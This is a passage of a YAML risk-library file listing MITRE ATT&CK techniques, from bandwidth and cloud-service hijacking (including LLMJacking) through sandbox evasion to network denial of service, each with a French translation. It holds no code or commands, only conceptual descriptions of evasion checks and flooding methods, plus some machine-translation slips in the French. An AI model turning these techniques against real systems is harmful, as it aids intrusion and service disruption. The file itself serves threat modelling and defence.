          \ \xEAtre cibl\xE9s en raison de la facilit\xE9 de d\xE9ploiement via des\
          \ API expos\xE9es et du potentiel de scaler les activit\xE9s de minage en\
          \ d\xE9ployant ou compromettant plusieurs conteneurs au sein d\u2019un environnement\
          \ ou d\u2019un cluster. (Citation : Unit\xE9 42 Malware Hildegard)(Citation\
          \ : Trend Micro Exposed Docker APIs)\n\nDe plus, certains malwares de minage\
          \ de cryptomonnaies identifient puis \xE9liminent les processus pour les\
          \ malwares concurrents afin de s\u2019assurer qu\u2019ils ne sont pas en\
          \ concurrence pour les ressources. (Citation : Tendance Micro War des mineurs\
          \ de cryptomonnaies)"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1496.002
    ref_id: T1496.002
    name: Bandwidth Hijacking
    description: "Adversaries may leverage the network bandwidth resources of co-opted\
      \ systems to complete resource-intensive tasks, which may impact system and/or\
      \ hosted service availability. \n\nAdversaries may also use malware that leverages\
      \ a system's network bandwidth as part of a botnet in order to facilitate [Network\
      \ Denial of Service](https://attack.mitre.org/techniques/T1498) campaigns and/or\
      \ to seed malicious torrents.(Citation: GoBotKR) Alternatively, they may engage\
      \ in proxyjacking by selling use of the victims' network bandwidth and IP address\
      \ to proxyware services.(Citation: Sysdig Proxyjacking) Finally, they may engage\
      \ in internet-wide scanning in order to identify additional targets for compromise.(Citation:\
      \ Unit 42 Leaked Environment Variables 2024)\n\nIn addition to incurring potential\
      \ financial costs or availability disruptions, this technique may cause reputational\
      \ damage if a victim\u2019s bandwidth is used for illegal activities.(Citation:\
      \ Sysdig Proxyjacking)\nhttps://attack.mitre.org/techniques/T1496/002"
    translations:
      fr:
        name: "D\xE9tournement de bande passante"
        description: "Les adversaires peuvent exploiter les ressources de bande passante\
          \ r\xE9seau des syst\xE8mes r\xE9cup\xE9r\xE9s pour accomplir des t\xE2\
          ches gourmandes en ressources, ce qui peut impacter la disponibilit\xE9\
          \ du syst\xE8me et/ou des services h\xE9berg\xE9s. \n\nLes adversaires peuvent\
          \ \xE9galement utiliser des logiciels malveillants qui exploitent la bande\
          \ passante r\xE9seau d\u2019un syst\xE8me dans le cadre d\u2019un botnet\
          \ afin de faciliter des campagnes de [d\xE9ni de service r\xE9seau](https://attack.mitre.org/techniques/T1498)\
          \ et/ou pour semer des torrents malveillants. (Citation : GoBotKR) Alternativement,\
          \ ils peuvent pratiquer le d\xE9tournement de proxys en vendant l\u2019\
          utilisation de la bande passante r\xE9seau et de l\u2019adresse IP des victimes\
          \ \xE0 des services de proxoxy. (Citation : D\xE9tournement de proxys Sysdig)\
          \ Enfin, ils peuvent effectuer un balayage \xE0 l\u2019\xE9chelle d\u2019\
          Internet afin d\u2019identifier d\u2019autres cibles susceptibles de compromettre.\
          \ (Citation : Unit\xE9 42 Variables environnementales fuit\xE9es 2024)\n\
          \nEn plus de comporter des co\xFBts financiers potentiels ou des perturbations\
          \ de disponibilit\xE9, cette technique peut nuire \xE0 la r\xE9putation\
          \ si la bande passante d\u2019une victime est utilis\xE9e pour des activit\xE9\
          s ill\xE9gales. (Citation : D\xE9tournement de proxys Sysdig)\nhttps://attack.mitre.org/techniques/T1496/002"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1496.003
    ref_id: T1496.003
    name: SMS Pumping
    description: "Adversaries may leverage messaging services for SMS pumping, which\
      \ may impact system and/or hosted service availability.(Citation: Twilio SMS\
      \ Pumping) SMS pumping is a type of telecommunications fraud whereby a threat\
      \ actor first obtains a set of phone numbers from a telecommunications provider,\
      \ then leverages a victim\u2019s messaging infrastructure to send large amounts\
      \ of SMS messages to numbers in that set. By generating SMS traffic to their\
      \ phone number set, a threat actor may earn payments from the telecommunications\
      \ provider.(Citation: Twilio SMS Pumping Fraud)\n\nThreat actors often use publicly\
      \ available web forms, such as one-time password (OTP) or account verification\
      \ fields, in order to generate SMS traffic. These fields may leverage services\
      \ such as Twilio, AWS SNS, and Amazon Cognito in the background.(Citation: Twilio\
      \ SMS Pumping)(Citation: AWS RE:Inforce Threat Detection 2024) In response to\
      \ the large quantity of requests, SMS costs may increase and communication channels\
      \ may become overwhelmed.(Citation: Twilio SMS Pumping)\nhttps://attack.mitre.org/techniques/T1496/003"
    translations:
      fr:
        name: Pompage SMS
        description: "Les adversaires peuvent utiliser les services de messagerie\
          \ pour le pompage SMS, ce qui peut affecter la disponibilit\xE9 du syst\xE8\
          me et/ou des services h\xE9berg\xE9s. (Citation : Pompe SMS Twilio) Le SMS\
          \ pumping est un type de fraude aux t\xE9l\xE9communications par lequel\
          \ un acteur malveillant obtient d\u2019abord un ensemble de num\xE9ros de\
          \ t\xE9l\xE9phone aupr\xE8s d\u2019un fournisseur de t\xE9l\xE9communications,\
          \ puis exploite l\u2019infrastructure de messagerie de la victime pour envoyer\
          \ de grandes quantit\xE9s de SMS aux num\xE9ros de cet ensemble. En g\xE9\
          n\xE9rant du trafic SMS vers son ensemble de num\xE9ros de t\xE9l\xE9phone,\
          \ un acteur malmenant peut recevoir des paiements du fournisseur de t\xE9\
          l\xE9communications. (Citation : Fraude de Twilio SMS)\n\nLes acteurs malveillants\
          \ utilisent souvent des formulaires web accessibles publiquement, tels que\
          \ le mot de passe \xE0 usage unique (OTP) ou des champs de v\xE9rification\
          \ de compte, afin de g\xE9n\xE9rer du trafic SMS. Ces domaines peuvent exploiter\
          \ des services tels que Twilio, AWS SNS et Amazon Cognito en arri\xE8re-plan.\
          \ (Citation : Pompe SMS Twilio)(Citation : AWS RE\_:Inforce Threat Detection\
          \ 2024) En r\xE9ponse au grand nombre de requ\xEAtes, les co\xFBts des SMS\
          \ peuvent augmenter et les canaux de communication peuvent \xEAtre submerg\xE9\
          s. (Citation : Pompe SMS Twilio)\nhttps://attack.mitre.org/techniques/T1496/003"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1496.004
    ref_id: T1496.004
    name: Cloud Service Hijacking
    description: "Adversaries may leverage compromised software-as-a-service (SaaS)\
      \ applications to complete resource-intensive tasks, which may impact hosted\
      \ service availability. \n\nFor example, adversaries may leverage email and\
      \ messaging services, such as AWS Simple Email Service (SES), AWS Simple Notification\
      \ Service (SNS), SendGrid, and Twilio, in order to send large quantities of\
      \ spam / [Phishing](https://attack.mitre.org/techniques/T1566) emails and SMS\
      \ messages.(Citation: Invictus IR DangerDev 2024)(Citation: Permiso SES Abuse\
      \ 2023)(Citation: SentinelLabs SNS Sender 2024) Alternatively, they may engage\
      \ in LLMJacking by leveraging reverse proxies to hijack the power of cloud-hosted\
      \ AI models.(Citation: Sysdig LLMJacking 2024)(Citation: Lacework LLMJacking\
      \ 2024)\n\nIn some cases, adversaries may leverage services that the victim\
      \ is already using. In others, particularly when the service is part of a larger\
      \ cloud platform, they may first enable the service.(Citation: Sysdig LLMJacking\
      \ 2024) Leveraging SaaS applications may cause the victim to incur significant\
      \ financial costs, use up service quotas, and otherwise impact availability.\n\
      https://attack.mitre.org/techniques/T1496/004"
    translations:
      fr:
        name: "D\xE9tournement de services cloud"
        description: "Les adversaires peuvent exploiter des applications logicielles\
          \ en tant que service (SaaS) compromises pour accomplir des t\xE2ches gourmandes\
          \ en ressources, ce qui peut affecter la disponibilit\xE9 des services h\xE9\
          berg\xE9s. \n\nPar exemple, les adversaires peuvent utiliser des services\
          \ de messagerie et de messagerie, tels que AWS Simple Email Service (SES),\
          \ AWS Simple Notification Service (SNS), SendGrid et Twilio, afin d\u2019\
          envoyer de grandes quantit\xE9s de spam / [phishing](https://attack.mitre.org/techniques/T1566)\
          \ et de messages SMS. (Citation : Invictus IR DangerDev 2024)(Citation :\
          \ Abus du Permiso SES 2023)(Citation : SentinelLabs SNS Sender 2024) Alternativement,\
          \ ils peuvent s\u2019engager dans le LLMJacking en utilisant des proxies\
          \ inverses pour d\xE9tourner la puissance des mod\xE8les d\u2019IA h\xE9\
          berg\xE9s dans le cloud. (Citation : Sysdig LLMJacking 2024)(Citation :\
          \ Dentelle LLMJacking 2024)\n\nDans certains cas, les adversaires peuvent\
          \ utiliser des services d\xE9j\xE0 utilis\xE9s par la victime. Dans d\u2019\
          autres, en particulier lorsque le service fait partie d\u2019une plateforme\
          \ cloud plus large, ils peuvent d\u2019abord activer le service. (Citation\
          \ : Sysdig LLMJacking 2024) Exploiter les applications SaaS peut entra\xEE\
          ner des co\xFBts financiers importants pour la victime, consommer les quotas\
          \ de service et affecter la disponibilit\xE9.\nhttps://attack.mitre.org/techniques/T1496/004"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1497
    ref_id: T1497
    name: Virtualization/Sandbox Evasion
    description: 'Adversaries may employ various means to detect and avoid virtualization
      and analysis environments. This may include changing behaviors based on the
      results of checks for the presence of artifacts indicative of a virtual machine
      environment (VME) or sandbox. If the adversary detects a VME, they may alter
      their malware to disengage from the victim or conceal the core functions of
      the implant. They may also search for VME artifacts before dropping secondary
      or additional payloads. Adversaries may use the information learned from [Virtualization/Sandbox
      Evasion](https://attack.mitre.org/techniques/T1497) during automated discovery
      to shape follow-on behaviors.(Citation: Deloitte Environment Awareness)


      Adversaries may use several methods to accomplish [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497)
      such as checking for security monitoring tools (e.g., Sysinternals, Wireshark,
      etc.) or other system artifacts associated with analysis or virtualization.
      Adversaries may also check for legitimate user activity to help determine if
      it is in an analysis environment. Additional methods include use of sleep timers
      or loops within malware code to avoid operating within a temporary sandbox.(Citation:
      Unit 42 Pirpi July 2015)'
    translations:
      fr:
        name: "Virtualisation/\xC9vasion en bac \xE0 sable"
        description: "Les adversaires peuvent employer divers moyens pour d\xE9tecter\
          \ et \xE9viter les environnements de virtualisation et d\u2019analyse. Cela\
          \ peut inclure des changements de comportements bas\xE9s sur les r\xE9sultats\
          \ des v\xE9rifications de la pr\xE9sence d\u2019artefacts indiquant un environnement\
          \ de machine virtuelle (VME) ou un bac \xE0 sable. Si l\u2019adversaire\
          \ d\xE9tecte un VME, il peut modifier son malware pour se d\xE9connecter\
          \ de la victime ou dissimuler les fonctions principales de l\u2019implant.\
          \ Ils peuvent \xE9galement rechercher des art\xE9facts VME avant de larguer\
          \ des charges utiles secondaires ou suppl\xE9mentaires. Les adversaires\
          \ peuvent utiliser les informations apprises via la [Virtualisation/\xC9\
          vasion bac \xE0 sable](https://attack.mitre.org/techniques/T1497) lors de\
          \ la d\xE9couverte automatis\xE9e pour fa\xE7onner les comportements suivants.\
          \ (Citation : Sensibilisation environnementale de Deloitte)\n\nLes adversaires\
          \ peuvent utiliser plusieurs m\xE9thodes pour r\xE9aliser la [Virtualisation/\xC9\
          vasion bac \xE0 sable](https://attack.mitre.org/techniques/T1497), telles\
          \ que la v\xE9rification des outils de surveillance de s\xE9curit\xE9 (par\
          \ exemple, Sysinternals, Wireshark, etc.) ou d\u2019autres artefacts syst\xE8\
          me associ\xE9s \xE0 l\u2019analyse ou \xE0 la virtualisation. Les adversaires\
          \ peuvent \xE9galement v\xE9rifier l\u2019activit\xE9 l\xE9gitime des utilisateurs\
          \ afin de d\xE9terminer si elle se trouve dans un environnement d\u2019\
          analyse. D\u2019autres m\xE9thodes incluent l\u2019utilisation de minuteurs\
          \ de sommeil ou de boucles dans le code logiciel malveillant pour \xE9viter\
          \ d\u2019op\xE9rer dans un bac \xE0 sable temporaire. (Citation : Unit\xE9\
          \ 42 Pirpi, juillet 2015)"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1497.001
    ref_id: T1497.001
    name: System Checks
    description: "Adversaries may employ various system checks to detect and avoid\
      \ virtualization and analysis environments. This may include changing behaviors\
      \ based on the results of checks for the presence of artifacts indicative of\
      \ a virtual machine environment (VME) or sandbox. If the adversary detects a\
      \ VME, they may alter their malware to disengage from the victim or conceal\
      \ the core functions of the implant. They may also search for VME artifacts\
      \ before dropping secondary or additional payloads. Adversaries may use the\
      \ information learned from [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497)\
      \ during automated discovery to shape follow-on behaviors.(Citation: Deloitte\
      \ Environment Awareness)\n\nSpecific checks will vary based on the target and/or\
      \ adversary, but may involve behaviors such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047),\
      \ [PowerShell](https://attack.mitre.org/techniques/T1059/001), [System Information\
      \ Discovery](https://attack.mitre.org/techniques/T1082), and [Query Registry](https://attack.mitre.org/techniques/T1012)\
      \ to obtain system information and search for VME artifacts. Adversaries may\
      \ search for VME artifacts in memory, processes, file system, hardware, and/or\
      \ the Registry. Adversaries may use scripting to automate these checks  into\
      \ one script and then have the program exit if it determines the system to be\
      \ a virtual environment. \n\nChecks could include generic system properties\
      \ such as host/domain name and samples of network traffic. Adversaries may also\
      \ check the network adapters addresses, CPU core count, and available memory/drive\
      \ size. Once executed, malware may also use [File and Directory Discovery](https://attack.mitre.org/techniques/T1083)\
      \ to check if it was saved in a folder or file with unexpected or even analysis-related\
      \ naming artifacts such as `malware`, `sample`, or `hash`.\n\nOther common checks\
      \ may enumerate services running that are unique to these applications, installed\
      \ programs on the system, manufacturer/product fields for strings relating to\
      \ virtual machine applications, and VME-specific hardware/processor instructions.(Citation:\
      \ McAfee Virtual Jan 2017) In applications like VMWare, adversaries can also\
      \ use a special I/O port to send commands and receive output. \n \nHardware\
      \ checks, such as the presence of the fan, temperature, and audio devices, could\
      \ also be used to gather evidence that can be indicative a virtual environment.\
      \ Adversaries may also query for specific readings from these devices.(Citation:\
      \ Unit 42 OilRig Sept 2018)\nhttps://attack.mitre.org/techniques/T1497/001"
    translations:
      fr:
        name: "Contr\xF4les syst\xE8me"
        description: "Les adversaires peuvent employer diverses v\xE9rifications syst\xE8\
          me pour d\xE9tecter et \xE9viter les environnements de virtualisation et\
          \ d\u2019analyse. Cela peut inclure des changements de comportements bas\xE9\
          s sur les r\xE9sultats des v\xE9rifications de la pr\xE9sence d\u2019artefacts\
          \ indiquant un environnement de machine virtuelle (VME) ou un bac \xE0 sable.\
          \ Si l\u2019adversaire d\xE9tecte un VME, il peut modifier son malware pour\
          \ se d\xE9connecter de la victime ou dissimuler les fonctions principales\
          \ de l\u2019implant. Ils peuvent \xE9galement rechercher des art\xE9facts\
          \ VME avant de larguer des charges utiles secondaires ou suppl\xE9mentaires.\
          \ Les adversaires peuvent utiliser les informations apprises via la [Virtualisation/\xC9\
          vasion bac \xE0 sable](https://attack.mitre.org/techniques/T1497) lors de\
          \ la d\xE9couverte automatis\xE9e pour fa\xE7onner les comportements suivants.\
          \ (Citation : Sensibilisation environnementale de Deloitte)\n\nLes v\xE9\
          rifications sp\xE9cifiques varient selon la cible et/ou l\u2019adversaire,\
          \ mais peuvent impliquer des comportements tels que [Windows Management\
          \ Instrumentation](https://attack.mitre.org/techniques/T1047), [PowerShell](https://attack.mitre.org/techniques/T1059/001),\
          \ [System Information Discovery](https://attack.mitre.org/techniques/T1082)\
          \ et [Query Registry](https://attack.mitre.org/techniques/T1012) pour obtenir\
          \ des informations syst\xE8me et rechercher des artefacts VME. Les adversaires\
          \ peuvent rechercher des artefacts VME dans la m\xE9moire, les processus,\
          \ le syst\xE8me de fichiers, le mat\xE9riel et/ou le Registre. Les adversaires\
          \ peuvent utiliser des scripts pour automatiser ces v\xE9rifications en\
          \ un seul script, puis faire sortir le programme s\u2019il d\xE9termine\
          \ que le syst\xE8me est un environnement virtuel. \n\nLes v\xE9rifications\
          \ peuvent inclure des propri\xE9t\xE9s syst\xE8me g\xE9n\xE9riques telles\
          \ que le nom h\xF4te/domaine et des exemples de trafic r\xE9seau. Les adversaires\
          \ peuvent \xE9galement v\xE9rifier les adresses des adaptateurs r\xE9seau,\
          \ le nombre de c\u0153urs du CPU et la taille de la m\xE9moire/disque disponible.\
          \ Une fois ex\xE9cut\xE9, les malwares peuvent \xE9galement utiliser [File\
          \ and Directory Discovery](https://attack.mitre.org/techniques/T1083) pour\
          \ v\xE9rifier s\u2019ils ont \xE9t\xE9 enregistr\xE9s dans un dossier ou\
          \ un fichier contenant des artefacts de nommage inattendus ou m\xEAme li\xE9\
          s \xE0 l\u2019analyse, tels que \xAB malware \xBB, \xAB sample \xBB ou \xAB\
          \ hash \xBB.\n\nD\u2019autres v\xE9rifications courantes peuvent \xE9num\xE9\
          rer les services ex\xE9cut\xE9s uniques \xE0 ces applications, les programmes\
          \ install\xE9s sur le syst\xE8me, les champs fabricant/produit pour les\
          \ cha\xEEnes de caract\xE8res li\xE9es aux applications de machines virtuelles,\
          \ ainsi que les instructions mat\xE9rielles/processeurs sp\xE9cifiques \xE0\
          \ chaque VME. (Citation : McAfee Virtual janvier 2017) Dans des applications\
          \ comme VMWare, les adversaires peuvent \xE9galement utiliser un port d\u2019\
          E/S sp\xE9cial pour envoyer des commandes et recevoir des sorties. \n \n\
          Des v\xE9rifications mat\xE9rielles, telles que la pr\xE9sence du ventilateur,\
          \ la temp\xE9rature et les dispositifs audio, pourraient \xE9galement \xEA\
          tre utilis\xE9es pour recueillir des preuves indiquant un environnement\
          \ virtuel. Les adversaires peuvent \xE9galement solliciter des relev\xE9\
          s sp\xE9cifiques de ces appareils. (Citation : Unit\xE9 42 OilRig sept.\
          \ 2018)\nhttps://attack.mitre.org/techniques/T1497/001"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1497.002
    ref_id: T1497.002
    name: User Activity Based Checks
    description: 'Adversaries may employ various user activity checks to detect and
      avoid virtualization and analysis environments. This may include changing behaviors
      based on the results of checks for the presence of artifacts indicative of a
      virtual machine environment (VME) or sandbox. If the adversary detects a VME,
      they may alter their malware to disengage from the victim or conceal the core
      functions of the implant. They may also search for VME artifacts before dropping
      secondary or additional payloads. Adversaries may use the information learned
      from [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497)
      during automated discovery to shape follow-on behaviors.(Citation: Deloitte
      Environment Awareness)


      Adversaries may search for user activity on the host based on variables such
      as the speed/frequency of mouse movements and clicks (Citation: Sans Virtual
      Jan 2016) , browser history, cache, bookmarks, or number of files in common
      directories such as home or the desktop. Other methods may rely on specific
      user interaction with the system before the malicious code is activated, such
      as waiting for a document to close before activating a macro (Citation: Unit
      42 Sofacy Nov 2018) or waiting for a user to double click on an embedded image
      to activate.(Citation: FireEye FIN7 April 2017)

      https://attack.mitre.org/techniques/T1497/002'
    translations:
      fr:
        name: "V\xE9rifications bas\xE9es sur l\u2019activit\xE9 utilisateur"
        description: "Les adversaires peuvent utiliser diverses v\xE9rifications d\u2019\
          activit\xE9 utilisateur pour d\xE9tecter et \xE9viter les environnements\
          \ de virtualisation et d\u2019analyse. Cela peut inclure des changements\
          \ de comportements bas\xE9s sur les r\xE9sultats des v\xE9rifications de\
          \ la pr\xE9sence d\u2019artefacts indiquant un environnement de machine\
          \ virtuelle (VME) ou un bac \xE0 sable. Si l\u2019adversaire d\xE9tecte\
          \ un VME, il peut modifier son malware pour se d\xE9connecter de la victime\
          \ ou dissimuler les fonctions principales de l\u2019implant. Ils peuvent\
          \ \xE9galement rechercher des art\xE9facts VME avant de larguer des charges\
          \ utiles secondaires ou suppl\xE9mentaires. Les adversaires peuvent utiliser\
          \ les informations apprises via la [Virtualisation/\xC9vasion bac \xE0 sable](https://attack.mitre.org/techniques/T1497)\
          \ lors de la d\xE9couverte automatis\xE9e pour fa\xE7onner les comportements\
          \ suivants. (Citation : Sensibilisation environnementale de Deloitte)\n\n\
          Les adversaires peuvent rechercher l\u2019activit\xE9 utilisateur sur l\u2019\
          h\xF4te en fonction de variables telles que la vitesse/fr\xE9quence des\
          \ mouvements de souris et des clics (Citation : Sans Virtual Jan 2016),\
          \ l\u2019historique du navigateur, le cache, les favoris ou le nombre de\
          \ fichiers dans des r\xE9pertoires courants comme home ou desktop. D\u2019\
          autres m\xE9thodes peuvent reposer sur une interaction sp\xE9cifique de\
          \ l\u2019utilisateur avec le syst\xE8me avant l\u2019activation du code\
          \ malveillant, comme attendre la fermeture d\u2019un document avant d\u2019\
          activer une macro (Citation : Unit\xE9 42 Sofacy, novembre 2018) ou attendre\
          \ qu\u2019un utilisateur double clique sur une image int\xE9gr\xE9e pour\
          \ l\u2019activer. (Citation : FireEye FIN7 avril 2017)\nhttps://attack.mitre.org/techniques/T1497/002"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1497.003
    ref_id: T1497.003
    name: Time Based Checks
    description: "Adversaries may employ various time-based methods to detect virtualization\
      \ and analysis environments, particularly those that attempt to manipulate time\
      \ mechanisms to simulate longer elapses of time. This may include enumerating\
      \ time-based properties, such as uptime or the system clock. \n\nAdversaries\
      \ may use calls like `GetTickCount` and `GetSystemTimeAsFileTime` to discover\
      \ if they are operating within a virtual machine or sandbox, or may be able\
      \ to identify a sandbox accelerating time by sampling and calculating the expected\
      \ value for an environment's timestamp before and after execution of a sleep\
      \ function.(Citation: ISACA Malware Tricks)\nhttps://attack.mitre.org/techniques/T1497/003"
    translations:
      fr:
        name: "V\xE9rifications temporelles"
        description: "Les adversaires peuvent employer diverses m\xE9thodes bas\xE9\
          es sur le temps pour d\xE9tecter les environnements de virtualisation et\
          \ d\u2019analyse, en particulier ceux qui tentent de manipuler les m\xE9\
          canismes temporels pour simuler des p\xE9riodes plus longues. Cela peut\
          \ inclure l\u2019\xE9num\xE9ration des propri\xE9t\xE9s bas\xE9es sur le\
          \ temps, telles que la disponibilit\xE9 ou l\u2019horloge du syst\xE8me.\
          \ \n\nLes adversaires peuvent utiliser des appels comme \xAB GetTickCount\
          \ \xBB et \xAB GetSystemTimeAsFileTime \xBB pour d\xE9couvrir s\u2019ils\
          \ op\xE8rent dans une machine virtuelle ou un bac \xE0 sable, ou bien identifier\
          \ un bac \xE0 sable acc\xE9l\xE9rant le temps en \xE9chantillonnant et calculant\
          \ la valeur attendue pour l\u2019horodatage d\u2019un environnement avant\
          \ et apr\xE8s l\u2019ex\xE9cution d\u2019une fonction de veille. (Citation\
          \ : Astuces de malware ISACA)\nhttps://attack.mitre.org/techniques/T1497/003"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1498
    ref_id: T1498
    name: Network Denial of Service
    description: 'Adversaries may perform Network Denial of Service (DoS) attacks
      to degrade or block the availability of targeted resources to users. Network
      DoS can be performed by exhausting the network bandwidth services rely on. Example
      resources include specific websites, email services, DNS, and web-based applications.
      Adversaries have been observed conducting network DoS attacks for political
      purposes(Citation: FireEye OpPoisonedHandover February 2016) and to support
      other malicious activities, including distraction(Citation: FSISAC FraudNetDoS
      September 2012), hacktivism, and extortion.(Citation: Symantec DDoS October
      2014)


      A Network DoS will occur when the bandwidth capacity of the network connection
      to a system is exhausted due to the volume of malicious traffic directed at
      the resource or the network connections and network devices the resource relies
      on. For example, an adversary may send 10Gbps of traffic to a server that is
      hosted by a network with a 1Gbps connection to the internet. This traffic can
      be generated by a single system or multiple systems spread across the internet,
      which is commonly referred to as a distributed DoS (DDoS).


      To perform Network DoS attacks several aspects apply to multiple methods, including
      IP address spoofing, and botnets.


      Adversaries may use the original IP address of an attacking system, or spoof
      the source IP address to make the attack traffic more difficult to trace back
      to the attacking system or to enable reflection. This can increase the difficulty
      defenders have in defending against the attack by reducing or eliminating the
      effectiveness of filtering by the source address on network defense devices.


      For DoS attacks targeting the hosting system directly, see [Endpoint Denial
      of Service](https://attack.mitre.org/techniques/T1499).

      https://attack.mitre.org/techniques/T1498'
    translations:
      fr:
        name: "D\xE9ni de service r\xE9seau"
        description: "Les adversaires peuvent effectuer des attaques de d\xE9ni de\
          \ service r\xE9seau (DoS) pour d\xE9grader ou bloquer la disponibilit\xE9\
          \ des ressources cibl\xE9es pour les utilisateurs. Les DoS r\xE9seau peuvent\
          \ \xEAtre r\xE9alis\xE9s en \xE9puisant la bande passante r\xE9seau sur\
          \ laquelle les services d\xE9pendent. Des ressources d\u2019exemple incluent\
          \ des sites web sp\xE9cifiques, des services de messagerie, le DNS et des\
          \ applications web. Des adversaires ont \xE9t\xE9 observ\xE9s menant des\
          \ attaques DoS en r\xE9seau \xE0 des fins politiques (Citation : FireEye\
          \ OpPoisonedHandover f\xE9vrier 2016) et pour soutenir d\u2019autres activit\xE9\
          s malveillantes, notamment la distraction (Citation : FSISAC FraudNetDoS\
          \ septembre 2012), le hacktivisme et l\u2019extorsion. (Citation : Symantec\
          \ DDoS octobre 2014)\n\nUn DoS r\xE9seau se produit lorsque la capacit\xE9\
          \ de bande passante de la connexion r\xE9seau \xE0 un syst\xE8me est \xE9\
          puis\xE9e en raison du volume de trafic malveillant dirig\xE9 vers la ressource\
          \ ou les connexions r\xE9seau et les dispositifs r\xE9seau dont la ressource\
          \ d\xE9pend. Par exemple, un adversaire peut envoyer 10 Gbps de trafic vers\
          \ un serveur h\xE9berg\xE9 par un r\xE9seau disposant d\u2019une connexion\
          \ Internet de 1 Gbps. Ce trafic peut \xEAtre g\xE9n\xE9r\xE9 par un seul\
          \ syst\xE8me ou plusieurs syst\xE8mes r\xE9partis sur Internet, ce qui est\
          \ commun\xE9ment appel\xE9 un DoS distribu\xE9 (DDoS).\n\nPour r\xE9aliser\
          \ des attaques DoS r\xE9seau, plusieurs aspects s\u2019appliquent \xE0 plusieurs\
          \ m\xE9thodes, notamment l\u2019usurpation d\u2019adresses IP et les botnets.\n\
          \nLes adversaires peuvent utiliser l\u2019adresse IP d\u2019origine d\u2019\
          un syst\xE8me attaquant, ou usurper l\u2019adresse IP source pour rendre\
          \ le trafic d\u2019attaque plus difficile \xE0 relier au syst\xE8me attaquant\
          \ ou pour permettre la r\xE9flexion. Cela peut augmenter la difficult\xE9\
          \ des d\xE9fenseurs \xE0 se d\xE9fendre contre l\u2019attaque en r\xE9duisant\
          \ ou en \xE9liminant l\u2019efficacit\xE9 du filtrage par adresse source\
          \ sur les dispositifs de d\xE9fense r\xE9seau.\n\nPour les attaques DoS\
          \ ciblant directement le syst\xE8me h\xF4te, voir [Endpoint Denial of Service](https://attack.mitre.org/techniques/T1499).\n\
          https://attack.mitre.org/techniques/T1498"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1498.001
    ref_id: T1498.001
    name: Direct Network Flood
    description: 'Adversaries may attempt to cause a denial of service (DoS) by directly
      sending a high-volume of network traffic to a target. This DoS attack may also
      reduce the availability and functionality of the targeted system(s) and network.
      [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when
      one or more systems are used to send a high-volume of network packets towards
      the targeted service''s network. Almost any network protocol may be used for
      flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful
      protocols such as TCP can be used as well.


      Botnets are commonly used to conduct network flooding attacks against networks
      and services. Large botnets can generate a significant amount of traffic from
      systems spread across the global Internet. Adversaries may have the resources
      to build out and control their own botnet infrastructure or may rent time on
      an existing botnet to conduct an attack. In some of the worst cases for distributed
      DoS (DDoS), so many systems are used to generate the flood that each one only
      needs to send out a small amount of traffic to produce enough volume to saturate
      the target network. In such circumstances, distinguishing DDoS traffic from
      legitimate clients becomes exceedingly difficult. Botnets have been used in
      some of the most high-profile DDoS flooding attacks, such as the 2012 series
      of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March
      2016)'
    translations:
      fr:
        name: "Inondation directe du r\xE9seau"
        description: "Les adversaires peuvent tenter de provoquer un d\xE9ni de service\
          \ (DoS) en envoyant directement un volume \xE9lev\xE9 de trafic r\xE9seau\
          \ \xE0 une cible. Cette attaque DoS peut \xE9galement r\xE9duire la disponibilit\xE9\
          \ et la fonctionnalit\xE9 du ou des syst\xE8mes et du r\xE9seau cibl\xE9\
          s. [Inondation directe du r\xE9seau](https://attack.mitre.org/techniques/T1498/001)s\
          \ sont lorsque un ou plusieurs syst\xE8mes sont utilis\xE9s pour envoyer\
          \ un volume \xE9lev\xE9 de paquets r\xE9seau vers le r\xE9seau du service\
          \ cibl\xE9. Presque tous les protocoles r\xE9seau peuvent \xEAtre utilis\xE9\
          s pour l\u2019inondation. Des protocoles sans \xE9tat tels que UDP ou ICMP\
          \ sont couramment utilis\xE9s, mais des protocoles \xE0 \xE9tat comme TCP\
          \ peuvent \xE9galement \xEAtre utilis\xE9s.\n\nLes botnets sont couramment\
          \ utilis\xE9s pour mener des attaques de saturation de r\xE9seau contre\
          \ des r\xE9seaux et des services. Les grands botnets peuvent g\xE9n\xE9\
          rer une quantit\xE9 significative de trafic provenant de syst\xE8mes r\xE9\
          partis sur l\u2019Internet mondial. Les adversaires peuvent disposer des\
          \ ressources pour construire et contr\xF4ler leur propre infrastructure\
          \ de botnet ou louer du temps sur un botnet existant pour mener une attaque.\
          \ Dans certains des pires cas pour les DoS distribu\xE9s (DDoS), tellement\
          \ de syst\xE8mes sont utilis\xE9s pour g\xE9n\xE9rer le flood que chacun\
          \ n\u2019a besoin que d\u2019envoyer une petite quantit\xE9 de trafic pour\
          \ produire suffisamment de volume afin de saturer le r\xE9seau cible. Dans\
          \ de telles circonstances, distinguer le trafic DDoS des clients l\xE9gitimes\
          \ devient extr\xEAmement difficile. Les botnets ont \xE9t\xE9 utilis\xE9\
          s dans certaines des attaques DDoS les plus m\xE9diatis\xE9es, comme la\
          \ s\xE9rie d\u2019incidents de 2012 visant de grandes banques am\xE9ricaines.\
          \ (Citation : USNYAG IranianBotnet mars 2016)"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1498.002
    ref_id: T1498.002
    name: Reflection Amplification
    description: 'Adversaries may attempt to cause a denial of service (DoS) by reflecting
      a high-volume of network traffic to a target. This type of Network DoS takes
      advantage of a third-party server intermediary that hosts and will respond to
      a given spoofed source IP address. This third-party server is commonly termed
      a reflector. An adversary accomplishes a reflection attack by sending packets
      to reflectors with the spoofed address of the victim. Similar to Direct Network
      Floods, more than one system may be used to conduct the attack, or a botnet
      may be used. Likewise, one or more reflectors may be used to focus traffic on
      the target.(Citation: Cloudflare ReflectionDoS May 2017) This Network DoS attack
      may also reduce the availability and functionality of the targeted system(s)
      and network.


